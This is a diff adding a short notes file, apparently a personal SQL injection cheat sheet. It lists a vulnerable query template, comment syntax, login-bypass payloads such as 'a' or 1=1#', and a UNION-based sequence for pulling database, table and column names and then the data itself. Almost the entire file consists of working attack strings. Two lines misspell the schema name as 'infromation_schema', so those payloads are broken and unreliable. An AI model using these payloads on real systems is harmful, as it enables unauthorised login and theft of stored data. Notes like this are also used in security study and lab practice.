@@ -1,0 +1,19 @@
+General query syntax:
+	SELECT * FROM accounts WHERE username='name' and password=''
+
+Comment syntax:
+	# or --
+
+Quotations
+	' and " interchangeable i think
+
+Useful injections:
+	Login bypass:
+		a' or 1=1#
+		a' or TRUE#
+		a' or 1=1--
+	Data extraction (general progression)
+		a' union select 1,2,3...[database(), user(), version()] # determine number of fields (iterate numbers)
+		a' union select 1,2,3...[table_name] from infromation_schema.tables# get table names
+		a' union select 1,2,3...[table_name] from infromation_schema.columns where table_name='name'# get table columns
+		a' union select 1,col1, col2, col3  from tableName# get actual info
